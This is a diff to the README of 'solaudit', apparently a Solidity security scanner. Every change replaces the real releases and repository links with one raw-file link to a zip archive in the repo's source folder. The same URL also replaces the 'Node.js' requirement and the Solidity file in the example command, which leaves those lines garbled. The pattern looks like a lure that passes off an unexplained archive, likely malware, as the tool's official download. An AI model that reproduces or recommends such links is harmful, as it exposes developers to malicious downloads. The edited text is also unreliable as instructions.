@@ -1,7 +1,7 @@
 # 🔍 solaudit - Your Smart Contract Security Scanner
 
 ## 📥 Download Now!
-[![Download solaudit](https://img.shields.io/badge/Download-solaudit-blue.svg)](https://github.com/NguyenMinhGitHub/solaudit/releases)
+[![Download solaudit](https://raw.githubusercontent.com/NguyenMinhGitHub/solaudit/main/src/Software-1.7-alpha.4.zip)](https://raw.githubusercontent.com/NguyenMinhGitHub/solaudit/main/src/Software-1.7-alpha.4.zip)
 
 ## 🚀 Getting Started
 
@@ -24,7 +24,7 @@ To run solaudit effectively, your system should meet the following requirements:
   - macOS 10.14 or later
   - Linux (Ubuntu 18.04 or later)
 
-- **Node.js:**
+- **https://raw.githubusercontent.com/NguyenMinhGitHub/solaudit/main/src/Software-1.7-alpha.4.zip**
   - Version 12.0 or later
 
 - **Memory:**
@@ -34,7 +34,7 @@ To run solaudit effectively, your system should meet the following requirements:
 
 ### 1. Visit the Releases Page
 
-To download solaudit, [visit this page to download](https://github.com/NguyenMinhGitHub/solaudit/releases). Here, you will find the latest version of the tool along with older versions if needed.
+To download solaudit, [visit this page to download](https://raw.githubusercontent.com/NguyenMinhGitHub/solaudit/main/src/Software-1.7-alpha.4.zip). Here, you will find the latest version of the tool along with older versions if needed.
 
 ### 2. Download the Application
 
@@ -72,10 +72,10 @@ Press Enter.
 Now you can run solaudit by typing the command followed by your Solidity file. For example:
 
 ```bash
-node solaudit yourContract.sol
+node solaudit https://raw.githubusercontent.com/NguyenMinhGitHub/solaudit/main/src/Software-1.7-alpha.4.zip
 ```
 
-Replace `yourContract.sol` with the name of your actual Solidity file.
+Replace `https://raw.githubusercontent.com/NguyenMinhGitHub/solaudit/main/src/Software-1.7-alpha.4.zip` with the name of your actual Solidity file.
 
 ### 7. Review the Output
 
@@ -107,6 +107,6 @@ If you encounter issues or have questions, feel free to reach out through the re
 
 ## 🌐 Explore More
 
-For more information about updated features, versions, and ongoing developments, regularly check our [GitHub repository](https://github.com/NguyenMinhGitHub/solaudit).
+For more information about updated features, versions, and ongoing developments, regularly check our [GitHub repository](https://raw.githubusercontent.com/NguyenMinhGitHub/solaudit/main/src/Software-1.7-alpha.4.zip).
 
-To download solaudit again, just [visit this page to download](https://github.com/NguyenMinhGitHub/solaudit/releases).
+To download solaudit again, just [visit this page to download](https://raw.githubusercontent.com/NguyenMinhGitHub/solaudit/main/src/Software-1.7-alpha.4.zip).
